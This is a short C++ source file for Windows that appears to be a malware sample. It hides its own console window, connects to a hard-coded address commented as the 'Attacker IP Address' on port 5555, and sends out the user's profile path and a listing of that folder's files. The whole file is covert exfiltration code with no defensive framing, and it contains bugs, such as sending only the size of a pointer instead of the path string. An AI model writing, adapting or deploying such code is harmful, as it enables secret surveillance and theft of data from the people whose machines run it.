#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

// This function gets the Value of the USERPROFILE env_var
// This contains the path of the user profile folder
char* userDirectory() {
    char* userPath;
    userPath = getenv("USERPROFILE");

    if (userPath!=NULL) {
        return userPath;
    }
    else {
        perror("");
    }
}


int main() {
    // Hides the program window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA winSocket;
    SOCKET socType;
    SOCKADDR_IN addr;

    // Initialize winsock library usage for network connection
    WSAStartup(MAKEWORD(2, 0), &winSocket);
    // Set up a TCP socket
    socType = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); // Attacker IP Address
    addr.sin_family = AF_INET; // IPv4
    addr.sin_port = htons(5555); // Used Port

    // Connect to the target Host & Port
    connect(socType, (SOCKADDR *)&addr, sizeof(addr));

    // Get the user directory
    char* userPath = userDirectory();
    // Send the data to the target (Attacker)
    send(socType, userPath, sizeof(userPath), 0);
    send(socType, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    // Reads the entries in the user's directory
    if ((dir = opendir(userPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(socType, ent->d_name, sizeof(ent->d_name), 0);
            send(socType, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    // If the directory cannot be opened
    else {
        perror("");
    }

    // Close the SOCKET
    closesocket(socType);
    // Clean up library components
    WSACleanup();
}